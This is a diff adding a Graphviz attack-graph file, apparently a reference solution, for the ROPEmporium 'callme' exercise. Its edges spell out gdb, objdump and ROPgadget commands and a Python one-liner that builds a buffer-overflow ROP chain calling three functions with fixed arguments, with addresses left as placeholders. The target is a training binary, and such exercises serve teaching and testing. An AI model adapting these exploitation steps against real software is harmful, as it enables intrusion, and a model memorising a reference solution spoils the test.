@@ -1,0 +1,19 @@
+digraph AttackGraph {
+  rankdir=LR;
+  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - ROPEmporium callme"];
+  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
+  edge [color="#555555", fontname="Helvetica", fontsize=10];
+
+  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
+  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Overflow offset identified"];
+  node1 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="callme PLT entries identified"];
+  node2 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Argument-loading gadget identified"];
+  node3 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Ordered multi-call payload crafted"];
+  node4 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="Flag printed"];
+
+  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="gdb -q ./callme"];
+  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="objdump -d callme | grep callme_"];
+  node1 -> node2 [color="#555555", fontname="Helvetica", fontsize="10", label="ROPgadget --binary callme | grep \"pop rdi\""];
+  node2 -> node3 [color="#555555", fontname="Helvetica", fontsize="10", label="python3 -c \"from struct import pack; import sys; pad=b'A'*40; pop3=0xPOP_RDI_RSI_RDX_RET; a1=0xdeadbeefdeadbeef; a2=0xcafebabecafebabe; a3=0xd00df00dd00df00d; callme_one=0xCALLME_ONE_PLT; callme_two=0xCALLME_TWO_PLT; callme_three=0xCALLME_THREE_PLT; chain=pad + pack('<Q', pop3)+pack('<Q', a1)+pack('<Q', a2)+pack('<Q', a3)+pack('<Q', callme_one)+pack('<Q', pop3)+pack('<Q', a1)+pack('<Q', a2)+pack('<Q', a3)+pack('<Q', callme_two)+pack('<Q', pop3)+pack('<Q', a1)+pack('<Q', a2)+pack('<Q', a3)+pack('<Q', callme_three); sys.stdout.buffer.write(chain)\" > payload.bin"];
+  node3 -> node4 [color="#555555", fontname="Helvetica", fontsize="10", label="./callme < payload.bin"];
+}
